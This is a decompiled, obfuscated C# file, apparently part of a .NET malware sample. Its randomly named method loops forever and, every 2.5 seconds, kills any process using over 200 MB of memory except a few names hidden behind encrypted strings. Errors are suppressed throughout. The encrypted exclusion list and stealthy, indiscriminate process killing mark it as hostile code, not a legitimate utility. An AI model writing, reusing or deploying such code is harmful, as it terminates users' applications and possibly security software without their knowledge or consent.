using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

public static class ZzeebxnKDWpc
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void jbPlKtSXcQmYNZ()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107377857)) && !process.ProcessName.Contains(getString_0(107378328)) && !process.ProcessName.Contains(getString_0(107378319)) && !process.ProcessName.Contains(getString_0(107378342)) && !process.ProcessName.Contains(getString_0(107378297)) && !process.ProcessName.Contains(getString_0(107378284)) && !process.ProcessName.Contains(getString_0(107378303)) && !process.ProcessName.Contains(getString_0(107378258)) && !process.ProcessName.Contains(getString_0(107378277)) && !process.ProcessName.Contains(getString_0(107378232)) && !process.ProcessName.Contains(getString_0(107378243)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static ZzeebxnKDWpc()
	{
		Strings.CreateGetStringDelegate(typeof(ZzeebxnKDWpc));
	}
}
